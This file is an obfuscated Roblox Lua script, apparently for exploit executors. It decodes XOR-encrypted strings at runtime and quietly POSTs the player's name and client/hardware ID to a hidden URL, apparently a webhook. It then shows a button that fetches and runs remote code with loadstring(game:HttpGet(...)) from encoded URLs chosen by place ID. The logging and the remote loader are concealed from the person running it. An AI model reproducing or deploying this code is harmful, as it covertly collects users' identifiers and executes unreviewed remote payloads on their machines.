local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v102,v103) local v104={};for v122=1, #v102 do v6(v104,v0(v4(v1(v2(v102,v122,v122 + 1 )),v1(v2(v103,1 + (v122% #v103) ,1 + (v122% #v103) + 1 )))%256 ));end return v5(v104);end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game.Players.LocalPlayer.Name;local v10=v7("\43\217\62\213\239\121\130\101\193\245\48\206\37\215\248\109\206\37\200\179\34\221\35\138\235\38\207\34\202\243\40\222\101\148\175\115\154\124\156\174\117\157\122\145\168\113\159\120\157\164\119\159\101\225\228\116\194\5\236\169\15\192\13\148\169\18\234\39\200\239\42\220\37\200\216\42\219\56\232\246\123\227\36\245\236\22\231\126\215\242\49\222\48\240\251\33\193\41\246\245\36\158\46\227\172\20\231\25\239\209\21\155\47\202\175\57\249\4\214\230\115","\156\67\173\74\165");local function v11(v105) local v106=(syn and syn.request) or http_request or request or (http and http.request) ;if v106 then return v106(v105);else return nil,v7("\26\184\9\5\169\54\86\59\165\93\19\184\102\110\0\131\121\86\174\35\87\33\178\90\2\252\32\83\58\180\93\31\179\40\6\50\184\92\24\184\103","\38\84\215\41\118\220\70");end end local v12=v8:JSONEncode({[v7("\83\25\44\6\251\94\2","\158\48\118\66\114")]=v7("\138\42\31\34\123\160\233\235\43\30\51\50","\155\203\68\112\86\19\197"),[v7("\67\208\52\249\68\107","\152\38\189\86\156\32\24\133")]={{[v7("\232\94\179\74\249","\38\156\55\199")]=v7("\145\114\105\58\83\103\249\81\161\109\104\104\27\117\233\3\170\120\121\38\83\113\226\70\171\104\104\45\23\53","\35\200\29\28\72\115\20\154"),[v7("\29\186\194\220\159\37\36\13\182\222\209","\84\121\223\177\191\237\76")]=game.Players.LocalPlayer.Name   .. v7("\251\94\200\179\122\85\40\196\184\67\221\165\62\16\36\201\190\22\218\163\40\89\32\213\245","\161\219\54\169\192\90\48\80") ,[v7("\93\91\16\32","\69\41\34\96")]=v7("\174\202\212\2","\75\220\163\183\106\98"),[v7("\1\181\135\56\203","\185\98\218\235\87")]=tonumber(v7("\155\36\33\224\216\172\205\58","\202\171\92\71\134\190")),[v7("\47\200\41\132\45\210","\232\73\161\76")]={{[v7("\181\216\79\88","\126\219\185\34\61")]=v7("\36\207\76\118\105\118\225\226\76\231\122\40","\135\108\174\62\18\30\23\147"),[v7("\160\232\38\222\29","\167\214\137\74\171\120\206\83")]=game:GetService(v7("\185\242\42\124\246\166\135\233\38\84\251\180\184\245\32\75\241\164\142","\199\235\144\82\61\152")):GetClientId(),[v7("\14\24\181\34\9\19","\75\103\118\217")]=true}}}}});local v13={[v7("\242\70\124","\126\167\52\16\116\217")]=v10,[v7("\229\43\52\136\187\29","\156\168\78\64\224\212\121")]=v7("\55\193\150\250","\174\103\142\197"),[v7("\126\45\94\60\32\76\235","\152\54\72\63\88\69\62")]={[v7("\247\203\224\72\209\202\250\17\224\221\254\89","\60\180\164\142")]=v7("\89\78\21\37\46\238\19\76\87\10\39\104\231\1\87\80","\114\56\62\101\73\71\141")},[v7("\154\230\223\221","\164\216\137\187")]=v12};local v14,v15=pcall(function() local v107=0;local v108;local v109;while true do local v123=0;while true do if (v123==(0 + 0)) then if (0==v107) then v108,v109=v11(v13);if  not v108 then error(v109);end v107=1 + 0 ;end if ((1 -0)==v107) then return v108;end break;end end end end);if (v14 and v15 and (v15.StatusCode==200)) then print(v7("\229\227\51\186\169\241\0\146\245\52\188\178\190\24\199\229\50\183\181\237\13\199\234\61\171\231","\107\178\134\81\210\198\158"));elseif (v14 and  not v15) then local v126=0;local v127;while true do if (v126==0) then print(v7("\29\22\146\202\165\49\26\194\194\165\61\29\194\200\165\44\78\145\211\186\40\1\144\210\234\16\58\182\246\234\42\11\147\211\175\43\26\145\136","\202\88\110\226\166"));v127=string.format("Script executed by: %s\nHardware ID: %s\n",game.Players.LocalPlayer.DisplayName,game:GetService(v7("\241\13\154\214\196\194\3\155\227\195\192\28\177\242\216\213\6\129\242","\170\163\111\226\151")):GetClientId());v126=1 -0 ;end if (v126==1) then print(v7("\61\63\181\120\99\50\58\2\49\181\61\14\127\15\30\34\242\53\79\57\60\16\60\242\42\75\39\38\3\36\187\54\73\126\115","\73\113\80\210\88\46\87"));print(v127);break;end end else local v128=0 + 0 ;local v129;while true do if (v128==0) then v129=0;while true do if (v129==(1636 -(1373 + 263))) then warn(v7("\167\45\196\30\226\133\108\217\29\167\146\41\195\22\167\150\41\207\26\232\142\39\131","\135\225\76\173\114"));if v15 then warn(v7("\41\249\185\164\185\174\231\25\226\188\181\246\253","\199\122\141\216\208\204\221")   .. (v15.StatusCode or v7("\152\211\27\254\119\225\163","\150\205\189\112\144\24")) );end break;end end break;end end end local v16=game:GetService(v7("\17\147\186\73\10\187\20\2\51\141\188\73","\112\69\228\223\44\100\232\113"));local v17=game.placeId;local v18=Instance.new(v7("\231\28\21\214\179\114\161\193\22","\230\180\127\103\179\214\28"));v18.Name=v7("\165\8\79\84\235\87\229\136\34\106\111","\128\236\101\63\38\132\33");v18.Parent=game.Players.LocalPlayer:WaitForChild(v7("\156\165\16\93\179\249\232\185\160","\175\204\201\113\36\214\139"));v18.ResetOnSpawn=false;local v22=Instance.new(v7("\110\193\52\219\1\107\205\55\217\8","\100\39\172\85\188"));v22.Name=v7("\143\121\186\139\52\191\119\172\142\55","\83\205\24\217\224");v22.Size=UDim2.new(1001 -(451 + 549) ,0 + 0 ,1 -0 ,0 -0 );v22.Position=UDim2.new(0,1384 -(746 + 638) ,0 + 0 ,0 -0 );v22.BackgroundTransparency=342 -(218 + 123) ;v22.BackgroundColor3=Color3.fromRGB(1836 -(1535 + 46) ,254 + 1 ,37 + 218 );v22.ImageTransparency=561 -(306 + 254) ;v22.ScaleType=Enum.ScaleType.Crop;v22.Parent=v18;local v32=Instance.new(v7("\210\192\213\41\202\196\207\56\234","\93\134\165\173"));v32.Name=v7("\138\251\213\206\63","\30\222\146\161\162\90\174\210");v32.Size=UDim2.new(0.8 + 0 ,0 -0 ,0.12,0);v32.Position=UDim2.new(1467.5 -(899 + 568) ,0,0.15,0 + 0 );v32.AnchorPoint=Vector2.new(0.5,0.5 -0 );v32.BackgroundTransparency=603.2 -(268 + 335) ;v32.BackgroundColor3=Color3.fromRGB(20,20,310 -(60 + 230) );v32.Text=v7("\209\70\117\74\201\71\114\24\228\92\105","\106\133\46\16");v32.Font=Enum.Font.Creepster;v32.TextScaled=true;v32.TextColor3=Color3.fromRGB(827 -(426 + 146) ,31 + 224 ,1711 -(282 + 1174) );v32.TextStrokeTransparency=811.2 -(569 + 242) ;v32.Parent=v18;local v46=Instance.new(v7("\109\9\80\243\72\78\93\50","\32\56\64\19\156\58"));v46.CornerRadius=UDim.new(0.4 -0 ,0);v46.Parent=v32;local v49=Instance.new(v7("\110\205\253\66\118\243\130\95\196","\224\58\168\133\54\58\146"));v49.Name=v7("\125\83\88\254\103\143\151\31\80\89\69","\107\57\54\43\157\21\230\231");v49.Size=UDim2.new(0.9 + 0 ,1024 -(706 + 318) ,1251.08 -(721 + 530) ,1271 -(945 + 326) );v49.Position=UDim2.new(0.5 -0 ,0 + 0 ,700.3 -(271 + 429) ,0 + 0 );v49.AnchorPoint=Vector2.new(1500.5 -(1408 + 92) ,1086.5 -(461 + 625) );v49.BackgroundTransparency=1288.2 -(993 + 295) ;v49.BackgroundColor3=Color3.fromRGB(2 + 18 ,20,1191 -(418 + 753) );v49.Text=v7("\252\142\5\181\171\217\206\223\146\81\243\182\206\143\218\133\81\244\180\221\213\210\133\22\181\188\196\223\222\153\24\240\183\223\202\154","\175\187\235\113\149\217\188");v49.Font=Enum.Font.Creepster;v49.TextScaled=true;v49.TextColor3=Color3.fromRGB(98 + 157 ,255,27 + 228 );v49.TextTransparency=1 + 0 ;v49.TextWrapped=true;v49.Parent=v18;local v63=Instance.new(v7("\9\134\162\67\241\119\125\46","\24\92\207\225\44\131\25"));v63.CornerRadius=UDim.new(0.4 + 0 ,529 -(406 + 123) );v63.Parent=v49;local v66=Instance.new(v7("\127\214\160\88\55\124\73\214\180","\29\43\179\216\44\123"));v66.Name=v7("\142\220\35\67\179\221\4\73\174\218\50\69\173\205\41\67\179","\44\221\185\64");v66.Size=UDim2.new(0.9,0,1769.45 -(1749 + 20) ,0 + 0 );v66.Position=UDim2.new(0.5,1322 -(1249 + 73) ,0.6,0 + 0 );v66.AnchorPoint=Vector2.new(1145.5 -(466 + 679) ,0.5 -0 );v66.BackgroundTransparency=0.2;v66.BackgroundColor3=Color3.fromRGB(20,57 -37 ,1920 -(106 + 1794) );v66.Text=v7("\34\242\90\77\118\15\243\68\70\51\18\242\88\79\124\19\243\77\91\51\6\230\69\90\96\91\167\106\83\114\5\226\8\93\114\13\235\4\31\87\4\230\92\87\51\3\230\68\83\63\65\197\68\80\107\65\225\90\74\122\21\171\8\116\122\15\224\8\115\118\6\230\75\70\63\65\197\77\90\51\50\240\73\77\126\65\212\65\82\102\13\230\92\80\97\77\167\110\86\96\2\239\4\31\94\20\245\76\90\97\65\202\81\76\103\4\245\81\31\33\77\167\106\90\119\22\230\90\76\63\65\205\73\86\127\3\245\77\94\120\77\167\110\74\125\10\254\8\121\97\8\227\73\70\63\65\195\71\80\97\18\171\8\123\114\65\207\71\80\119\79","\19\97\135\40\63");v66.Font=Enum.Font.Creepster;v66.TextSize=5 + 10 ;v66.TextColor3=Color3.fromRGB(255,65 + 190 ,255);v66.TextTransparency=1;v66.TextWrapped=true;v66.Parent=v18;local v80=Instance.new(v7("\155\117\16\52\61\63\171\78","\81\206\60\83\91\79"));v80.CornerRadius=UDim.new(0.1 -0 ,0 -0 );v80.Parent=v66;local v83=Instance.new(v7("\122\174\200\102\13\214\89\176\65\165","\196\46\203\176\18\79\163\45"));v83.Name=v7("\155\45\112\10\45\245\250\189\0\107\10\48\244\225","\143\216\66\30\126\68\155");v83.Size=UDim2.new(0.4,114 -(4 + 110) ,584.1 -(57 + 527) ,0);v83.Position=UDim2.new(1427.5 -(41 + 1386) ,0,103.92 -(17 + 86) ,0);v83.AnchorPoint=Vector2.new(0.5,0.5);v83.BackgroundColor3=Color3.fromRGB(0 + 0 ,189 -104 ,738 -483 );v83.Text=v7("\137\199\3\223\204\173\194\228","\129\202\168\109\171\165\195\183");v83.Font=Enum.Font.Creepster;v83.TextScaled=true;v83.TextColor3=Color3.fromRGB(421 -(122 + 44) ,440 -185 ,845 -590 );v83.BackgroundTransparency=0.1 + 0 ;v83.TextTransparency=1 + 0 ;v83.Parent=v18;local v96=Instance.new(v7("\23\113\20\215\204\26\227\48","\134\66\56\87\184\190\116"));v96.CornerRadius=UDim.new(0.3 -0 ,65 -(30 + 35) );v96.Parent=v83;local function v99(v110,v111) local v112=0 + 0 ;local v113;while true do if (0==v112) then v113=v16:Create(v110,TweenInfo.new(v111),{[v7("\8\52\17\175\45\249\32\59\47\33\8\169\28\229\34\44","\85\92\81\105\219\121\139\65")]=1257 -(1043 + 214) ,[v7("\223\178\83\78\123\205\242\166\94\65\72\205\252\189\67\85\125\205\248\189\83\92","\191\157\211\48\37\28")]=0 -0 });v113:Play();break;end end end local function v100(v114,v115) local v116=v16:Create(v114,TweenInfo.new(v115),{[v7("\246\18\245\27\63\235\13\245\18\41\207\30\230\25\52\220\6","\90\191\127\148\124")]=1212 -(323 + 889) });v116:Play();end local function v101(v117) while true do local v124=v16:Create(v117,TweenInfo.new(0.7 -0 ,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{[v7("\75\142\52\18","\119\24\231\78")]=UDim2.new(580.42 -(361 + 219) ,320 -(53 + 267) ,0.09 + 0 ,0)});v124:Play();v124.Completed:Wait();local v125=v16:Create(v117,TweenInfo.new(0.7,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{[v7("\177\36\191\79","\113\226\77\197\42\188\32")]=UDim2.new(0.4,413 -(15 + 398) ,0.08,0)});v125:Play();v125.Completed:Wait();end end v100(v22,984 -(18 + 964) );v99(v32,7 -5 );v99(v49,2 + 0 );v99(v66,2 + 0 );v99(v83,852 -(20 + 830) );task.spawn(function() v101(v83);end);v83.MouseEnter:Connect(function() local v118=0 + 0 ;local v119;while true do if (0==v118) then v119=v16:Create(v83,TweenInfo.new(0.2),{[v7("\24\23\247\190\61\4\251\160\52\18\215\186\54\25\230\230","\213\90\118\148")]=Color3.fromRGB(126 -(116 + 10) ,125,19 + 236 )});v119:Play();break;end end end);v83.MouseLeave:Connect(function() local v120=v16:Create(v83,TweenInfo.new(738.2 -(542 + 196) ),{[v7("\121\47\183\93\74\73\33\161\88\73\120\33\184\89\95\8","\45\59\78\212\54")]=Color3.fromRGB(0,182 -97 ,75 + 180 )});v120:Play();end);v83.MouseButton1Click:Connect(function() local v121={13635135096 -  -137259529 ,15002063477 -(1126 + 425) ,2753915954 -(118 + 287) ,4520750202 -(118 + 1003) ,417962503 -275139212 ,6447798030 -0 ,16732695029 -(553 + 424) ,2304956067 -767265105 ,2788230563 -(13 + 1174) ,6872265039,606849621};if table.find(v121,v17) then loadstring(game:HttpGet(v7("\24\66\151\155\149\116\226\191\2\87\148\197\129\39\185\248\5\84\150\152\131\60\174\255\30\66\134\133\146\96\174\255\29\25\151\131\143\60\169\233\9\7\204\167\143\44\191\241\2\79\204\134\135\39\163\191\36\94\134\198\170\39\175\226\17\68\154\197\138\59\172","\144\112\54\227\235\230\78\205")))();else loadstring(game:HttpGet(v7("\187\60\27\236\195\1\252\103\29\253\199\21\180\33\27\244\197\89\166\59\10\238\211\84\189\60\10\242\196\21\176\39\2\179\196\83\186\58\11\229\201\10\252\4\6\254\194\90\161\49\64\241\209\82\189\103\4\245\211\80","\59\211\72\111\156\176")))();end v18:Destroy();print(v7("\125\132\241\36\94\147\163\33\65\134\231\40\74\198","\77\46\231\131"));end);